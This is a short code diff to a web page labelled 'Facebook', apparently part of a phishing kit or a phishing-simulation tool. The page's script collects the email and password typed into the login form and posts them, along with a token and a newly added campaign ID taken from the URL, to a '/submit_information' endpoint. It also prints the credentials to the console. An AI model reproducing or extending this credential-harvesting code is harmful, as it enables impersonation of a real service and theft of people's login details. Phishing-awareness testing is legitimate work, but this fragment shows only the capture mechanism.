@@ -89,13 +89,15 @@
             const username = document.querySelector('input[type="email"]').value;
             const password = document.querySelector('input[type="password"]').value;
             const page = 'Facebook';
-            var token = window.location.pathname.split('/')[2];
+            var campaignId = window.location.pathname.split('/')[2];
+            var token = window.location.pathname.split('/')[3];
+            console.log(username, password, token, page, campaignId);
             fetch('/submit_information', {
                 method: 'POST',
                 headers: {
                         'Content-Type': 'application/json',
                     },
-                body: JSON.stringify({ username, password, token, page })
+                body: JSON.stringify({ username, password, token, page, campaignId })
             })
             .then(response => {
                 if(response.ok) {
